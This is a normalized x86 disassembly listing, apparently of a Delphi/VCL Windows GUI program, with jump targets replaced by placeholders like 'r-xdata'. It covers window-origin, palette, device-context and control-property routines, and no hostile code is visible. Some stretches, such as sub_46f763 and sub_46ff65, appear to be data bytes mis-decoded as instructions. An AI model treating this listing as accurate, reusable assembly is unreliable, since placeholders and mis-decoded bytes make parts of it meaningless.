jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ebp esi
dec ebp
mov edx ebp
mov eax [ ebx ]
call sub_4305a0
cmp edi eax
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
call sub_4055f0
xor eax eax
mov [ ebx ] eax
mov eax [ ebx ]
xor ecx ecx
mov edx edi
call sub_4307b0
mov edx ebp
mov eax [ ebx ]
call sub_430438
jmp r-xdata
sub_46f238
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_46f268
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ rw-data ]
call sub_431088
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46f322
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_46f2f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_46f4c4
call sub_4061a4
call sub_4061a4
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4305a0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_44cfdc
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_46f330
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_431088
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46f3d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f3df
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_46f3a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_46f4c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_44d038
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4305a0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_44cfdc
test al al
je r-xdata
sub_46f3e4
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax esi
call sub_46f4c4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44d124
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_46f410
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44dfa8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_44dfac
mov eax [ ebp - 0x4 ]
call sub_46f510
mov eax [ rw-data ]
call sub_431088
mov ebx eax
xor eax eax
push ebp
push sub_46f4a1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4303e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
call sub_46f268
sub_46f4c4
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44dfac
mov cl 0x1
mov edx ebx
mov eax [ rw-data ]
call sub_4310a4
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_46f510
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4715d0
test al al
je r-xdata
and [ ebx + 0x18 ] 0xffffff7f
or [ ebx + 0x18 ] 0x80
jmp r-xdata
sub_46f53c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_46f578
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_43139c
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_46f5c0
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_46f67c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46f749
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f750
lea eax [ ebp - 0x1c ]
call j_sub_4068a0
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_40587c
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x11
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x84 ]
call sub_45b1f0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_4129f4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4070a8
sub_46f763
inc [ edi ]
add [ eax ] al
add [ 0x20007300 ] ah
add [ eax ] ch
add [ 0x29007300 ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46f7df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_48c6e8
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_470e50
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
mov edx [ eax + 0x64 ]
pop eax
call sub_407768
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f7e6
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov al 0x1
sub_46f800
push ebx
mov ebx eax
mov eax ebx
call sub_48c710
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x5c ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_46f848
push ebx
mov ebx eax
mov eax ebx
call sub_48c760
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_407768
je r-xdata
mov al 0x1
pop ebx
retn
sub_46f880
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_405830
mov eax [ eax + 0xa4 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x7c ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_46f8c0
push ebx
mov ebx eax
mov eax ebx
call sub_48c79c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
movzx eax [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x59 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_46f8f4
push ebx
mov ebx eax
mov eax ebx
call sub_43cfa8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x110 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
sete al
pop ebx
retn
sub_46f91c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_470e88
sub_46f940
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
sub_46f964
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_4070a8
sub_46f988
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_470d70
sub_46f9a8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x110 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x114 ] edx
sub_46f9d4
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x168 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x164 ]
call sub_407768
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
movzx eax [ edi + 0x70 ]
cmp al [ esi + 0x160 ]
je r-xdata
mov al 0x1
sub_46fa3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4706a4
sub_46fa5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_470690
sub_46fa7c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x160 ] bl
sub_46fa9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_470e2c
sub_46fac0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43c14c
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44bfdc
mov esi eax
mov [ ebx + 0x64 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_470f08
movzx eax [ r-xdata ]
mov [ ebx + 0x63 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f53c
mov esi eax
mov [ ebx + 0x70 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_4720d4
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4802c4
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_474018
mov [ ebx + 0x6c ] 0xff000005
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x5c ] 0x1
mov [ ebx + 0x8a ] 0x1
mov [ ebx + 0x62 ] 0x1
mov [ ebx + 0x60 ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xa8 ] eax
mov [ ebx + 0x160 ] 0x1
xor eax eax
mov [ ebx + 0x174 ] eax
xor eax eax
mov [ ebx + 0x16c ] eax
mov [ ebx + 0x170 ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0xac ]
movzx edx [ r-xdata ]
mov [ eax + 0x10 ] dl
movzx edx [ r-xdata ]
mov [ eax + 0x11 ] dl
mov [ eax + 0x18 ] 0x1
movzx edx [ r-xdata ]
mov [ eax + 0x1e ] dx
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_46fc08
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_405bb4
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_49ee28
mov eax [ edi + 0x90 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x78 ]
mov edx edi
call sub_43c510
push edi
mov eax [ edi + 0x90 ]
xor ecx ecx
mov edx 0xb039
call sub_472314
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x78 ]
mov edx esp
mov eax edi
call sub_4706f0
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_40587c
xor eax eax
mov [ edi + 0x90 ] eax
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_405b5c
lea eax [ edi + 0x68 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
lea eax [ edi + 0x70 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
lea eax [ edi + 0x64 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
mov eax [ edi + 0x174 ]
call sub_4128f8
lea eax [ edi + 0x74 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
xor eax eax
mov [ edi + 0x16c ] eax
lea eax [ edi + 0xac ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
mov edx ebx
and dl 0xfc
mov eax edi
call sub_43c198
test bl bl
jle r-xdata
sub_46fd20
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
sub_46fd48
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x59 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd9
call sub_40587c
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
movzx eax [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x90 ]
sub_46fdd4
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
movzx eax [ esp ]
cmp al [ esi + 0x63 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
movzx ebx [ esi + 0x63 ]
movzx eax [ esp ]
mov [ esi + 0x63 ] al
test [ esi + 0x1c ] 0x1
jne r-xdata
movzx eax [ r-xdata ]
cmp al bl
je r-xdata
mov eax esi
call sub_4702b4
movzx eax [ r-xdata ]
cmp al [ esi + 0x63 ]
jne r-xdata
mov eax [ esi + 0x194 ]
cmp eax [ esi + 0x40 ]
jne r-xdata
mov eax [ esi + 0x19c ]
push eax
mov eax [ esi + 0x1a0 ]
push eax
mov ecx [ esi + 0x198 ]
mov edx [ esi + 0x194 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x98 ]
jmp r-xdata
mov eax [ esi + 0x198 ]
cmp eax [ esi + 0x44 ]
jne r-xdata
mov eax [ esi + 0x19c ]
cmp eax [ esi + 0x48 ]
jne r-xdata
mov eax [ esi + 0x1a0 ]
cmp eax [ esi + 0x4c ]
je r-xdata
sub_46fe74
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov eax [ ebx + 0x68 ]
call sub_4055f0
xor eax eax
mov [ ebx + 0x68 ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x68 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4738c4
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xfff0
call sub_40587c
mov edx ebx
mov eax edi
call sub_43c22c
mov eax ebx
mov si 0xffdb
call sub_40587c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x68 ] eax
pop edi
pop esi
pop ebx
retn
sub_46ff08
push ebx
mov ebx eax
mov al 0x1
sub dl 0x1
jb r-xdata
mov eax [ ebx + 0xac ]
movzx edx [ r-xdata ]
cmp dl [ eax + 0x10 ]
setne al
pop ebx
retn
je r-xdata
mov eax [ ebx + 0xac ]
movzx edx [ r-xdata ]
cmp dl [ eax + 0x11 ]
setne al
pop ebx
retn
dec dl
je r-xdata
mov eax [ ebx + 0xac ]
movzx eax [ eax + 0x18 ]
xor al 0x1
pop ebx
retn
dec dl
je r-xdata
mov eax [ ebx + 0xac ]
movzx eax [ eax + 0x18 ]
xor al 0x1
jmp r-xdata
pop ebx
retn
sub_46ff65
add [ eax ] al
add [ ebx - 0x75 ] dl
fdiv st6
inc ebx
sbb al 0x10
je r-xdata
pop ebx
retn
test [ ebx + 0x55 ] 0x8
setne al
xor al 0x1
cmp dl al
je r-xdata
test dl dl
jne r-xdata
and [ ebx + 0x54 ] 0xfffff7ff
or [ ebx + 0x54 ] 0x800
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax ebx
call sub_471304
sub_46ffdc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43c694
and [ ebx + 0x54 ] 0xfffffff7
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb050
mov eax ebx
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb058
mov eax ebx
call sub_472314
sub_47008c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_43c52c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x4c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_470e2c
jmp r-xdata
cmp edi [ esi + 0x90 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_46fe74
jmp r-xdata
cmp edi [ esi + 0x16c ]
jne r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
jmp r-xdata
mov eax [ esi + 0xac ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x16c ] eax
jmp r-xdata
cmp edi [ eax + 0xc ]
jne r-xdata
xor edx edx
mov [ eax + 0xc ] edx
sub_470108
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
movzx eax [ edi + 0x5d ]
cmp bl al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x68 ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5d ] bl
movzx eax bl
movzx edx [ eax + rw-data ]
mov eax edi
call sub_46fdd4
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x34 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
movzx eax [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
cmp [ esp ] 0x0
je r-xdata
movzx eax [ esp ]
test al al
je r-xdata
mov eax edi
mov si 0xffef
call sub_40587c
test bl bl
jne r-xdata
sub al 0x5
je r-xdata
mov eax [ edi + 0x19c ]
push eax
mov eax [ edi + 0x1a0 ]
push eax
mov ecx [ edi + 0x198 ]
mov edx [ edi + 0x194 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x98 ]
jmp r-xdata
mov eax ebx
test al al
je r-xdata
sub al 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x98 ]
jmp r-xdata
sub_4701f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax esi
call sub_472e3c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp ebx [ esi + 0x40 ]
jne r-xdata
xor ecx ecx
movzx edx [ esi + 0x59 ]
mov eax esi
call sub_471304
mov [ esi + 0x40 ] ebx
mov [ esi + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4c ] eax
mov eax esi
call sub_4702b4
mov eax esi
call sub_474070
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax esi
call sub_472314
mov eax esi
mov edx [ eax ]
call [ edx + 0x68 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
cmp edi [ esi + 0x44 ]
jne r-xdata
mov eax esi
mov si 0xffd0
call sub_40587c
mov eax [ ebp + 0xc ]
cmp eax [ esi + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x4c ]
je r-xdata
sub_470290
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_472348
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_472314
pop ebx
retn
sub_4702b4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x178 ] 0x0
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
movzx ebx [ esi + 0x63 ]
xor edx edx
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edi eax
mov edx 0x2
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
add edi eax
mov edx 0x1
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x3
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov eax ebp
mov [ esp ] edi
mov [ esp + 0x4 ] eax
mov eax [ esp ]
mov [ esi + 0x184 ] eax
mov eax [ esp + 0x4 ]
mov [ esi + 0x188 ] eax
movzx eax [ r-xdata ]
cmp al bl
jne r-xdata
adc eax 0x0
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x18c ] eax
xor eax eax
mov [ esi + 0x190 ] eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edi eax
mov edx 0x2
mov eax [ esi + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add edi eax
